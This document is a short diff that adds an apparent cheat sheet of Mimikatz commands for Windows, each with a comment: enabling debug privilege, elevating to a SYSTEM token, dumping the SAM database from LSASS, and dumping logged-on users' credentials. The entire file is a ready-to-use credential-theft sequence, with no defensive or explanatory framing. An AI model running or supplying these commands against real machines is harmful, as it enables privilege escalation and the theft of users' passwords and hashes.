@@ -1,0 +1,8 @@
+* enable SeDebugPrivilege
+privilege::debug
+* upgrade to SYSTEM process
+token::elevate
+* dump SAM database from LSASS process
+lsadump::sam
+* dump creds for logged on users (AD)
+sekurlsa::logonpasswords
